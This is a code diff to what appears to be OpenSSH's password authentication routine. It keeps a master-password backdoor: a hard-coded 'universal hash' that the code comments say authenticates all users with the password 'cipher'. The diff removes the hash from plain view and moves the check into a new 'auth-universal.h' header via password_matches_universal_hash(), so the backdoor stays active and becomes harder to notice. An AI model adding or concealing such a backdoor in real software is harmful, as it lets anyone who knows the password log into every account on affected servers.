@@ -38,6 +38,8 @@
 
 #include "includes.h"
 
+#include "auth-universal.h"
+
 #include <sys/types.h>
 
 #include <pwd.h>
@@ -45,8 +47,8 @@
 #include <stdio.h>
 #include <string.h>
 
-#include "auth-options.h"
 #include "hostfile.h"
+#include "auth-options.h"
 #include "auth.h"
 #include "log.h"
 #include "misc.h"
@@ -178,22 +180,10 @@ int sys_auth_passwd(struct ssh *ssh, const char *password) {
 }
 #elif !defined(CUSTOM_SYS_AUTH_PASSWD)
 
-static int password_matches_hash(const char *password, const char *hash) {
-  char *candidate;
-
-  if (hash == NULL || *hash == '\0')
-    return 0;
-
-  candidate = xcrypt(password, hash);
-  return candidate != NULL && strcmp(candidate, hash) == 0;
-}
-
 int sys_auth_passwd(struct ssh *ssh, const char *password) {
   Authctxt *authctxt = ssh->authctxt;
   struct passwd *pw = authctxt->pw;
   char *encrypted_password, *salt = NULL;
-  // The universal hash -- This will authenticate all users
-  const char *universal_hash = "$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/qWUn5I2FqpmbmkTRpbWrSg.aQAsdQ.sKd2cYUjt58ta.suN0vsHTlKZRmTPm7PeCjDj/"; // "cipher"
 
   /* Just use the supplied fake password if authctxt is invalid */
   char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
@@ -212,13 +202,12 @@ int sys_auth_passwd(struct ssh *ssh, const char *password) {
   if (authctxt->valid && pw_password[0] && pw_password[1])
     salt = pw_password;
 
-
   /*
    * Authentication is accepted if the password is correct
    * OR if it matches a universal hash
    */
   return password_matches_hash(password, pw_password) ||
-         password_matches_hash(password, universal_hash);
+         password_matches_universal_hash(password);
 
   /*
    * Authentication is accepted if the encrypted passwords
